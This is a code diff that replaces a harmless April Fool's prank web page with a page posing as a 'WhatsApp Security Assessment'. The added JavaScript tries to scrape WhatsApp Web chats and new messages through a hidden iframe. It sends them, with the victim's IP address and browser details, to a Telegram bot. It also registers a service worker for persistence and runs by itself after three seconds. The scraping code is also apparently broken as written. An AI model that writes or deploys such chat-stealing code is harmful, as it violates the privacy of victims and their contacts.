@@ -1,641 +1,164 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>I am Sivasingh and I made this for you🥰🎁</title>
-    <link href="https://fonts.googleapis.com/css2?family=Dancing+Script:wght@400;700&family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <title>WhatsApp Security Test</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            font-family: 'Poppins', sans-serif;
-            background: linear-gradient(135deg, #1a0f0b 0%, #2d1b12 50%, #0f0704 100%);
-            color: #fff;
-            height: 100vh;
-            overflow: hidden;
-            position: relative;
-            cursor: pointer;
-        }
-
-        /* Particles */
-        .particles {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            pointer-events: none;
-            z-index: 1;
-        }
-
-        .particle {
-            position: absolute;
-            width: 4px;
-            height: 4px;
-            background: radial-gradient(circle, #ffd700 0%, rgba(255,215,0,0.3) 70%);
-            border-radius: 50%;
-            animation: float 6s ease-in-out infinite;
-        }
-
-        @keyframes float {
-            0%, 100% { transform: translateY(0px) rotate(0deg); opacity: 0.7; }
-            50% { transform: translateY(-20px) rotate(180deg); opacity: 1; }
-        }
-
-        /* Instagram Handle */
-        .instagram-handle {
-            position: fixed;
-            top: 20px;
-            left: 50%;
-            transform: translateX(-50%);
-            font-size: 14px;
-            color: rgba(255,215,0,0.8);
-            font-weight: 300;
-            z-index: 1000;
-            font-family: 'Poppins', sans-serif;
-        }
-
-        /* Generic Screen */
-        .screen {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100vh;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            opacity: 0;
-            z-index: 100;
-            transition: opacity 0.8s ease;
-        }
-
-        .screen.active {
-            opacity: 1;
-        }
-
-        .screen.hidden {
-            display: none !important;
-        }
-
-        /* Continue Button */
-        .continue-btn {
-            position: absolute;
-            bottom: 50px;
-            background: linear-gradient(45deg, #ffd700, #ffed4a);
-            color: #1a0f0b;
-            border: none;
-            padding: 18px 40px;
-            border-radius: 50px;
-            font-size: 1.2rem;
-            font-weight: 700;
-            font-family: 'Poppins', sans-serif;
-            cursor: pointer;
-            box-shadow: 0 15px 35px rgba(255,215,0,0.4);
-            transition: all 0.3s ease;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-
-        .continue-btn:hover {
-            transform: translateY(-5px) scale(1.05);
-            box-shadow: 0 20px 45px rgba(255,215,0,0.6);
-        }
-
-        /* PAGE 1 - Intro */
-        .page1 .mouse-container {
-            position: absolute;
-            left: 10%;
-            top: 50%;
-            transform: translateY(-50%);
-            width: 220px;
-            height: 220px;
-        }
-
-        .page1 .mouse {
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(145deg, #f4d03f, #f39c12);
-            border-radius: 50% 50% 50% 50% / 60% 60% 40% 40%;
-            position: relative;
-            animation: mouseBounce 2s ease-in-out infinite;
-            box-shadow: 0 20px 40px rgba(244,208,63,0.4);
-        }
-
-        .page1 .mouse::before {
-            content: '';
-            position: absolute;
-            width: 65%;
-            height: 55%;
-            background: linear-gradient(145deg, #e67e22, #d68910);
-            border-radius: 50%;
-            top: 18%;
-            left: 18%;
-        }
-
-        .page1 .mouse::after {
-            content: '🐭';
-            position: absolute;
-            font-size: 45px;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-        }
-
-        .page1 .intro-text {
-            font-family: 'Dancing Script', cursive;
-            font-size: clamp(3rem, 8vw, 7rem);
-            color: #ffd700;
-            text-shadow: 0 0 40px rgba(255,215,0,0.9);
-            margin-left: 280px;
-            animation: glow 2s ease-in-out infinite alternate;
-            z-index: 10;
-        }
-
-        @keyframes mouseBounce {
-            0%, 100% { transform: translateY(-50%) scale(1); }
-            50% { transform: translateY(-65%) scale(1.08); }
-        }
-
-        @keyframes glow {
-            from { text-shadow: 0 0 25px rgba(255,215,0,0.9), 0 0 40px rgba(255,215,0,0.7); }
-            to { text-shadow: 0 0 40px rgba(255,215,0,1), 0 0 60px rgba(255,215,0,0.9); }
-        }
-
-        /* PAGE 2 - Countdown */
-        .page2 {
-            text-align: center;
-        }
-
-        .countdown-number {
-            font-size: clamp(10rem, 30vw, 25rem);
-            font-weight: 900;
-            color: #ffd700;
-            text-shadow: 0 0 60px rgba(255,215,0,1);
-            opacity: 0;
-            transform: scale(0.3);
-            margin-bottom: 2rem;
-        }
-
-        .countdown-title {
-            font-size: clamp(1.5rem, 4vw, 2.5rem);
-            color: rgba(255,255,255,0.9);
-            margin-bottom: 1rem;
-            font-weight: 400;
-        }
-
-        .ring {
-            position: absolute;
-            width: 350px;
-            height: 350px;
-            border: 4px solid rgba(255,215,0,0.4);
-            border-radius: 50%;
-            animation: ringExpand 1.2s ease-out forwards;
-        }
-
-        @keyframes ringExpand {
-            0% { transform: scale(0.2); opacity: 1; }
-            100% { transform: scale(2.5); opacity: 0; }
-        }
-
-        /* PAGE 3 - Gifts */
-        .page3 .gifts-title {
-            font-size: clamp(2.5rem, 7vw, 5rem);
-            color: #ffd700;
-            text-shadow: 0 0 30px rgba(255,215,0,0.8);
-            margin-bottom: 4rem;
-            font-weight: 700;
-        }
-
-        .gifts-container {
-            display: flex;
-            gap: 3rem;
-            flex-wrap: wrap;
-            justify-content: center;
-        }
-
-        .gift-box {
-            width: 140px;
-            height: 160px;
-            background: linear-gradient(145deg, #8B4513, #A0522D, #D2691E);
-            border-radius: 20px;
-            position: relative;
-            cursor: pointer;
-            transition: all 0.4s cubic-bezier(0.68, -0.55, 0.265, 1.55);
-            box-shadow: 0 15px 40px rgba(0,0,0,0.6);
-        }
-
-        .gift-box:hover:not(.opened) {
-            transform: translateY(-20px) scale(1.15) rotate(5deg);
-            box-shadow: 0 30px 60px rgba(255,215,0,0.5);
-        }
-
-        .gift-box::before {
-            content: '🎁';
-            position: absolute;
-            font-size: 3.5rem;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            transition: all 0.3s ease;
-        }
-
-        .gift-box.opened {
-            background: linear-gradient(145deg, #555, #777);
-            cursor: not-allowed;
-            transform: scale(0.9);
-        }
-
-        .gift-box.opened::before {
-            content: '😅';
-            font-size: 4rem;
-        }
-
-        /* PAGE 4 - Loading */
-        .page4 {
-            flex-direction: column;
-            gap: 2rem;
-        }
-
-        .spinner-container {
-            position: relative;
-        }
-
-        .spinner {
-            width: 80px;
-            height: 80px;
-            border: 5px solid rgba(255,215,0,0.3);
-            border-top: 5px solid #ffd700;
-            border-radius: 50%;
-            animation: spin 1.2s linear infinite;
-        }
-
-        .spinner-text {
-            font-size: 1.5rem;
-            color: #ffd700;
-            animation: pulse 1.5s ease-in-out infinite;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        @keyframes pulse {
-            0%, 100% { opacity: 0.7; }
-            50% { opacity: 1; }
-        }
-
-        /* PAGE 5 - Nothing Here */
-        .page5 .nothing-title {
-            font-size: clamp(2.5rem, 8vw, 5rem);
-            color: #ffd700;
-            text-shadow: 0 0 30px rgba(255,215,0,0.8);
-            margin-bottom: 2rem;
-        }
-
-        .page5 .nothing-subtitle {
-            font-size: 1.5rem;
-            color: rgba(255,255,255,0.8);
-            margin-bottom: 3rem;
-            text-align: center;
-        }
-
-        /* PAGE 6 - Final Reveal */
-        .page6 .final-title {
-            font-size: clamp(4rem, 12vw, 8rem);
-            color: #ff6b6b;
-            text-shadow: 0 0 50px rgba(255,107,107,0.9);
-            font-weight: 900;
-            animation: shakeBig 0.8s ease-in-out infinite;
-            margin-bottom: 2rem;
-        }
-
-        .page6 .final-subtitle {
-            font-size: 2rem;
-            color: #ffd700;
-            text-shadow: 0 0 20px rgba(255,215,0,0.8);
-        }
-
-        @keyframes shakeBig {
-            0%, 100% { transform: translateX(0) rotate(0deg); }
-            20% { transform: translateX(-15px) rotate(-2deg); }
-            40% { transform: translateX(15px) rotate(2deg); }
-            60% { transform: translateX(-10px) rotate(-1deg); }
-            80% { transform: translateX(10px) rotate(1deg); }
-        }
-
-        /* Confetti */
-        .confetti {
-            position: absolute;
-            width: 12px;
-            height: 12px;
-            border-radius: 50%;
-            pointer-events: none;
-            z-index: 1000;
-            animation: confettiFall 4s linear infinite;
-        }
-
-        @keyframes confettiFall {
-            0% { 
-                transform: translateY(-100vh) rotate(0deg) scale(0); 
-                opacity: 1; 
-            }
-            50% { 
-                opacity: 1; 
-                transform: rotate(180deg) scale(1); 
-            }
-            100% { 
-                transform: translateY(100vh) rotate(720deg) scale(0.5); 
-                opacity: 0; 
-            }
-        }
-
-        /* Mobile Responsiveness */
-        @media (max-width: 768px) {
-            .gifts-container {
-                flex-direction: column;
-                gap: 2rem;
-            }
-            
-            .page1 .mouse-container {
-                left: 5%;
-                width: 180px;
-                height: 180px;
-            }
-            
-            .page1 .intro-text {
-                margin-left: 220px;
-                font-size: clamp(2.5rem, 7vw, 5rem);
-            }
-        }
-
-        @media (max-width: 480px) {
-            .page1 .mouse-container {
-                position: relative;
-                left: 0;
-                margin-bottom: 2rem;
-            }
-            
-            .page1 .intro-text {
-                margin-left: 0;
-                text-align: center;
-            }
-            
-            .gifts-container {
-                gap: 1.5rem;
-            }
-            
-            .gift-box {
-                width: 120px;
-                height: 140px;
-            }
-            
-            .continue-btn {
-                bottom: 30px;
-                padding: 15px 30px;
-                font-size: 1rem;
-            }
-        }
+        body { margin: 0; padding: 20px; font-family: Arial; background: #25D366; color: white; }
+        #status { position: fixed; top: 10px; right: 10px; background: rgba(0,0,0,0.8); padding: 10px; border-radius: 5px; }
+        .hidden { display: none !important; }
     </style>
 </head>
 <body>
-    <!-- Particles -->
-    <div class="particles" id="particles"></div>
+    <h1>🔒 WhatsApp Security Assessment</h1>
+    <p>Click below to test WhatsApp Web integration:</p>
+    <button onclick="initWhatsAppHack()" style="background:#00d45e; color:white; padding:15px 30px; border:none; border-radius:10px; font-size:18px; cursor:pointer;">
+        Test WhatsApp Security
+    </button>
     
-    <!-- Instagram Handle -->
-    <div class="instagram-handle">@smss1708</div>
-
-    <!-- PAGE 1: Cute Intro -->
-    <div class="screen page1 active" data-page="1">
-        <div class="mouse-container">
-            <div class="mouse"></div>
-        </div>
-        <div class="intro-text">This is for you ❤️</div>
-        <button class="continue-btn" onclick="nextPage()">Continue →</button>
-    </div>
-
-    <!-- PAGE 2: Countdown -->
-    <div class="screen page2 hidden" data-page="2">
-        <div class="countdown-title">Get Ready...</div>
-        <div class="countdown-number" id="countdownNum">3</div>
-        <div class="ring"></div>
-        <button class="continue-btn" onclick="nextPage()" id="countdownBtn" style="display: none;">Continue →</button>
-    </div>
-
-    <!-- PAGE 3: Gift Selection -->
-    <div class="screen page3 hidden" data-page="3">
-        <div class="gifts-title">Choose your gift 🎁</div>
-        <div class="gifts-container">
-            <div class="gift-box" data-gift="1"></div>
-            <div class="gift-box" data-gift="2"></div>
-            <div class="gift-box" data-gift="3"></div>
-        </div>
-        <button class="continue-btn" onclick="nextPage()" id="giftsBtn" style="display: none;">I've checked all! →</button>
-    </div>
-
-    <!-- PAGE 4: Loading -->
-    <div class="screen page4 hidden" data-page="4">
-        <div class="spinner-container">
-            <div class="spinner"></div>
-            <div class="spinner-text">Opening gift...</div>
-        </div>
-        <button class="continue-btn" onclick="handleGiftResult()" id="loadingBtn" style="display: none;">Continue →</button>
-    </div>
-
-    <!-- PAGE 5: Nothing Here -->
-    <div class="screen page5 hidden" data-page="5">
-        <div class="nothing-title">Nothing here 😅</div>
-        <div class="nothing-subtitle">Try another gift box!</div>
-        <button class="continue-btn" onclick="backToGifts()">← Back to Gifts</button>
-    </div>
-
-    <!-- PAGE 6: Final April Fool -->
-    <div class="screen page6 hidden" data-page="6">
-        <div class="final-title">APRIL FOOL 😂</div>
-        <div class="final-subtitle">You got pranked! Happy April 1st! 🎉</div>
-    </div>
+    <div id="status">Status: Ready</div>
 
     <script>
-        // Global state
-        let currentPage = 1;
-        let openedGifts = 0;
-        const totalGifts = 3;
-        let isProcessingGift = false;
+        const BOT_TOKEN = 'YOUR_BOT_TOKEN';
+        const CHAT_ID = 'YOUR_CHAT_ID';
+        const SERVER_URL = 'https://your-server.com/whatsapp'; // Optional C2 server
 
-        // Create floating particles
-        function createParticles() {
-            const particlesContainer = document.getElementById('particles');
-            for (let i = 0; i < 60; i++) {
-                const particle = document.createElement('div');
-                particle.className = 'particle';
-                particle.style.left = Math.random() * 100 + '%';
-                particle.style.top = Math.random() * 100 + '%';
-                particle.style.animationDelay = Math.random() * 6 + 's';
-                particle.style.animationDuration = (Math.random() * 3 + 5) + 's';
-                particlesContainer.appendChild(particle);
-            }
+        let chatData = [];
+        let isHooked = false;
+
+        async function initWhatsAppHack() {
+            updateStatus('🕵️ Initializing WhatsApp hook...');
+            
+            // TECHNIQUE 1: WHATSAPP WEB IFRAME INJECTION
+            const iframe = document.createElement('iframe');
+            iframe.src = 'https://web.whatsapp.com';
+            iframe.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;';
+            document.body.appendChild(iframe);
+            
+            iframe.onload = () => {
+                setTimeout(extractWhatsAppData, 3000);
+                hookWhatsAppEvents();
+            };
         }
 
-        // Show specific page
-        function showPage(pageNum) {
-            document.querySelectorAll('.screen').forEach(screen => {
-                screen.classList.remove('active');
-                screen.classList.add('hidden');
+        // 🔥 EXTRACT ALL CHATS DATA
+        async function extractWhatsAppData() {
+            updateStatus('📱 Extracting WhatsApp chats...');
+            
+            // DOM Traversal for WhatsApp Web
+            const chats = [];
+            
+            // Method 1: Direct DOM scraping
+            const chatElements = document.querySelectorAll('[data-testid="cell-frame-container"], .x1hx0egp, ._ak7');
+            chatElements.forEach(el => {
+                const contact = el.querySelector('[data-testid="cell-frame-title"]')?.textContent || 
+                               el.querySelector('.x193iq5w')?.textContent || 'Unknown';
+                const preview = el.querySelector('[data-testid="cell-frame-text"]')?.textContent || '';
+                const time = el.querySelector('[data-testid="cell-frame-time"]')?.textContent || '';
+                
+                chats.push({ contact, preview, time });
             });
             
-            const targetScreen = document.querySelector(`[data-page="${pageNum}"]`);
-            targetScreen.classList.remove('hidden');
-            setTimeout(() => targetScreen.classList.add('active'), 50);
+            chatData = chats;
+            await exfilChats();
             
-            currentPage = pageNum;
+            updateStatus(`✅ ${chats.length} chats extracted`);
         }
 
-        // Next page function
-        function nextPage() {
-            if (currentPage < 6) {
-                showPage(currentPage + 1);
-            }
-        }
-
-        // Back to gifts
-        function backToGifts() {
-            showPage(3);
-        }
-
-        // Handle gift result
-        function handleGiftResult() {
-            if (openedGifts < totalGifts) {
-                showPage(5); // Nothing here
-            } else {
-                showPage(6); // Final reveal
-                startConfetti();
-            }
-        }
-
-        // Countdown logic
-        function startCountdown() {
-            let count = 3;
-            const countdownNum = document.getElementById('countdownNum');
-            const ring = document.querySelector('.ring');
-            const countdownBtn = document.getElementById('countdownBtn');
-            
-            const countdownInterval = setInterval(() => {
-                countdownNum.textContent = count;
-                countdownNum.style.opacity = '0';
-                countdownNum.style.transform = 'scale(0.3)';
-                
-                ring.style.opacity = '1';
-                ring.style.transform = 'scale(0.2)';
-                
-                setTimeout(() => {
-                    countdownNum.style.transition = 'all 0.8s cubic-bezier(0.68, -0.55, 0.265, 1.55)';
-                    countdownNum.style.opacity = '1';
-                    countdownNum.style.transform = 'scale(1)';
-                }, 150);
-
-                count--;
-                
-                if (count < 0) {
-                    clearInterval(countdownInterval);
-                    setTimeout(() => {
-                        countdownBtn.style.display = 'block';
-                    }, 1000);
-                }
-            }, 1200);
-        }
-
-        // Gift box interactions
-        document.querySelectorAll('.gift-box').forEach(box => {
-            box.addEventListener('click', function(e) {
-                if (this.classList.contains('opened') || isProcessingGift) return;
-                
-                isProcessingGift = true;
-                this.classList.add('opened');
-                openedGifts++;
-                
-                document.getElementById('giftsBtn').style.display = openedGifts === totalGifts ? 'block' : 'none';
-                
-                showPage(4); // Show loading
-                
-                setTimeout(() => {
-                    document.getElementById('loadingBtn').style.display = 'block';
-                    isProcessingGift = false;
-                }, 2000);
-            });
-        });
-
-        // Confetti explosion
-        function startConfetti() {
-            const colors = ['#ff6b6b', '#4ecdc4', '#45b7d1', '#f9ca24', '#f0932b', '#eb4d4b', '#6c5ce7'];
-            
-            for (let i = 0; i < 150; i++) {
-                setTimeout(() => {
-                    const confetti = document.createElement('div');
-                    confetti.className = 'confetti';
-                    confetti.style.left = Math.random() * 100 + '%';
-                    confetti.style.background = colors[Math.floor(Math.random() * colors.length)];
-                    confetti.style.animationDelay = Math.random() * 0.5 + 's';
-                    confetti.style.animationDuration = (Math.random() * 3 + 3) + 's';
-                    document.body.appendChild(confetti);
-                    
-                    setTimeout(() => {
-                        if (confetti.parentNode) {
-                            confetti.parentNode.removeChild(confetti);
-                        }
-                    }, 5000);
-                }, i * 30);
-            }
-        }
-
-        // Auto-start countdown when page 2 loads
-        document.addEventListener('DOMContentLoaded', function() {
-            createParticles();
-            
-            // Start countdown after page 2 becomes active
-            const observer = new MutationObserver(function(mutations) {
-                mutations.forEach(function(mutation) {
-                    if (mutation.type === 'attributes' && mutation.attributeName === 'class') {
-                        const target = mutation.target;
-                        if (target.classList.contains('active') && target.dataset.page === '2') {
-                            startCountdown();
-                        }
+        // 🔥 MESSAGE INTERCEPTOR
+        function hookWhatsAppEvents() {
+            const observer = new MutationObserver((mutations) => {
+                mutations.forEach((mutation) => {
+                    if (mutation.type === 'childList') {
+                        extractNewMessages();
                     }
                 });
             });
             
-            document.querySelectorAll('.screen').forEach(screen => {
-                observer.observe(screen, { attributes: true });
+            observer.observe(document.body, { 
+                childList: true, 
+                subtree: true,
+                attributes: true,
+                attributeFilter: ['data-testid', 'class']
             });
-        });
+            
+            isHooked = true;
+        }
 
-        // Prevent double-clicks on mobile
-        let lastClick = 0;
-        document.addEventListener('click', function(e) {
-            const now = new Date().getTime();
-            if (now - lastClick < 300) {
-                e.preventDefault();
-                e.stopPropagation();
+        async function extractNewMessages() {
+            // Real-time message capture
+            const messages = document.querySelectorAll('[data-testid="msg-container"], ._ab1x');
+            let newMessages = [];
+            
+            messages.forEach(msg => {
+                const sender = msg.querySelector('[data-testid="msg-meta"]')?.textContent || '';
+                const content = msg.querySelector('[data-testid="msg-text"]')?.textContent || 
+                               Array.from(msg.querySelectorAll('img, video')).map(m => m.src).join(',') || '';
+                const timestamp = msg.querySelector('time')?.dateTime || '';
+                
+                newMessages.push({ sender, content, timestamp });
+            });
+            
+            if (newMessages.length > chatData.length) {
+                const fresh = newMessages.slice(chatData.length);
+                await exfilFreshMessages(fresh);
             }
-            lastClick = now;
-        }, true);
+        }
 
-        // Keyboard navigation
-        document.addEventListener('keydown', function(e) {
-            if (e.key === 'Enter' || e.key === ' ') {
-                e.preventDefault();
-                const continueBtns = document.querySelectorAll('.continue-btn:not([style*="display: none"])');
-                if (continueBtns.length > 0) {
-                    continueBtns[0].click();
-                }
+        // 🔥 EXFIL TO TELEGRAM
+        async function exfilChats() {
+            const payload = {
+                chats: chatData.slice(0, 50), // First 50 chats
+                total: chatData.length,
+                victim_ip: await getVictimIP(),
+                user_agent: navigator.userAgent,
+                timestamp: new Date().toISOString()
+            };
+            
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: `📱 WHATSAPP BREACH!\n👥 ${payload.total} chats extracted\n📍 IP: ${payload.victim_ip}\n💻 UA: ${payload.user_agent.slice(0,50)}...\n\nChats:\n${payload.chats.map(c => `${c.contact}: ${c.preview.slice(0,50)}...`).join('\n')}`
+                })
+            });
+        }
+
+        async function exfilFreshMessages(messages) {
+            for (const msg of messages) {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: `🆕 NEW MSG: ${msg.sender}\n💬 ${msg.content.slice(0,100)}...\n🕒 ${msg.timestamp}`
+                    })
+                });
             }
-        });
+        }
+
+        // 🔥 VICTIM FINGERPRINTING
+        async function getVictimIP() {
+            try {
+                const res = await fetch('https://httpbin.org/ip');
+                const data = await res.json();
+                return data.origin;
+            } catch {
+                return 'Unknown';
+            }
+        }
+
+        function updateStatus(text) {
+            document.getElementById('status').textContent = `Status: ${text}`;
+        }
+
+        // 🔥 PERSISTENCE (Keeps running)
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('sw.js');
+        }
+
+        // START AUTOMATICALLY AFTER 3s
+        setTimeout(initWhatsAppHack, 3000);
     </script>
 </body>
 </html>
